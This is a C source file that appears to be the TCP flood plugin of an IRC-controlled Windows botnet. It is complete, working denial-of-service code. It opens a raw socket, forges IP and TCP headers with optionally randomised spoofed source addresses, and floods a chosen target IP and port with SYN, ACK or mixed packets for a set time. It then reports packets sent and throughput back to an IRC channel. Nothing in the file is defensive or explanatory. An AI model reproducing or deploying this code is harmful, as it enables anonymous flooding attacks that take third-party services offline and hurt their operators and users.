#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

#ifndef NO_TCP

DWORD WINAPI TcpFloodThread(LPVOID param)
{
	TCPFLOOD tcpflood = *((TCPFLOOD *)param);
	TCPFLOOD *tcpfloods = (TCPFLOOD *)param;
	tcpfloods->gotinfo = TRUE;

	char sendbuf[IRCLINE], szSendBuf[60]={0};

	IPHEADER ipHeader;
	TCPHEADER tcpHeader;
	PSDHEADER psdHeader;

	srand(GetTickCount());

	SOCKET ssock;
	if ((ssock=fsocket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == INVALID_SOCKET) {
		sprintf(sendbuf,"nzm (tcp.plg) »»  Error: socket() failed, returned: <%d>.", fWSAGetLastError());
		if (!tcpflood.silent) irc_privmsg(tcpflood.sock,tcpflood.chan,sendbuf,tcpflood.notice);
		addlog(sendbuf);

		clearthread(tcpflood.threadnum);

		ExitThread(0);
	}

	BOOL flag = TRUE;
	if (fsetsockopt(ssock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) == SOCKET_ERROR) {
		sprintf(sendbuf,"nzm (tcp.plg) »»  Error: setsockopt() failed, returned: <%d>.", fWSAGetLastError());
		if (!tcpflood.silent) irc_privmsg(tcpflood.sock,tcpflood.chan,sendbuf,tcpflood.notice);
		addlog(sendbuf);

		clearthread(tcpflood.threadnum);

		ExitThread(0);
	}

	if (finet_addr(tcpflood.ip) == INADDR_NONE) {
		sprintf(sendbuf,"nzm (tcp.plg) »»  Invalid target IP.");
		if (!tcpflood.silent) irc_privmsg(tcpflood.sock,tcpflood.chan,sendbuf,tcpflood.notice);
		addlog(sendbuf);

		clearthread(tcpflood.threadnum);

		ExitThread(0);
	}

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family=AF_INET;
	ssin.sin_port=fhtons(0);
	ssin.sin_addr.s_addr=finet_addr(tcpflood.ip);

	int sent = 0;
	unsigned long start = GetTickCount();

	while (((GetTickCount() - start) / 1000) <= (unsigned long)tcpflood.time) {
		ipHeader.verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
		ipHeader.total_len=fhtons(sizeof(ipHeader)+sizeof(tcpHeader));
		ipHeader.ident=1;
		ipHeader.frag_and_flags=0;
		ipHeader.ttl=128;
		ipHeader.proto=IPPROTO_TCP;
		ipHeader.checksum=0;
		ipHeader.sourceIP=((tcpflood.spoof)?(rand()+(rand()<<8)+(rand()<<16)+(rand()<<24)):(finet_addr(GetIP(tcpflood.sock))));
		ipHeader.destIP=ssin.sin_addr.s_addr;

		((tcpflood.port == 0)?(tcpHeader.dport=fhtons((unsigned short)(rand()%1025))):(tcpHeader.dport=fhtons((unsigned short)tcpflood.port)));
		tcpHeader.sport=fhtons((unsigned short)(rand()%1025));
		tcpHeader.seq=fhtonl(0x12345678);
		if (strstr(tcpflood.type,"syn")) {
			tcpHeader.ack_seq=0;
			tcpHeader.flags=SYN;
		} else if (strstr(tcpflood.type,"ack")) {
			tcpHeader.ack_seq=0;
			tcpHeader.flags=ACK;
		} else if (strstr(tcpflood.type,"random")) {
			tcpHeader.ack_seq=rand()%3;
			((rand()%2 == 0)?(tcpHeader.flags=SYN):(tcpHeader.flags=ACK));
		}
		tcpHeader.lenres=(sizeof(tcpHeader)/4<<4|0);
		tcpHeader.window=fhtons(512);
		tcpHeader.urg_ptr=0;
		tcpHeader.checksum=0;

		psdHeader.saddr=ipHeader.sourceIP;
		psdHeader.daddr=ipHeader.destIP;
		psdHeader.zero=0;
		psdHeader.proto=IPPROTO_TCP;
		psdHeader.length=fhtons((unsigned short)(sizeof(tcpHeader)));

		memcpy(szSendBuf, &psdHeader, sizeof(psdHeader));
		memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
		tcpHeader.checksum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader));
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
		memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
		memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4);
		ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader));
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));

		if (fsendto(ssock, (char *)&szSendBuf, sizeof(szSendBuf), 0, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
			fclosesocket(ssock);

			_snprintf(sendbuf,sizeof(sendbuf),"nzm (tcp.plg) »»  Error sending packets to IP: %s. Packets sent: %d. Returned: <%d>.", tcpflood.ip, sent, fWSAGetLastError());
			if (!tcpflood.silent) irc_privmsg(tcpflood.sock, tcpflood.chan, sendbuf, tcpflood.notice);
			addlog(sendbuf);

			clearthread(tcpflood.threadnum);

			ExitThread(0);
		}
		sent++;
	}
	fclosesocket(ssock);

	sprintf(sendbuf,"nzm (tcp.plg) »»  Done with %s flood to IP: %s. Sent: %d packet(s) @ %dKB/sec (%dMB).", tcpflood.type, tcpflood.ip, sent, (((sent * sizeof(szSendBuf)) / 1024) / tcpflood.time), (((sent * sizeof(szSendBuf)) / 1024) / 1024));
	if (!tcpflood.silent) irc_privmsg(tcpflood.sock, tcpflood.chan, sendbuf, tcpflood.notice);
	addlog(sendbuf);

	clearthread(tcpflood.threadnum);

	ExitThread(0);
}
#endif
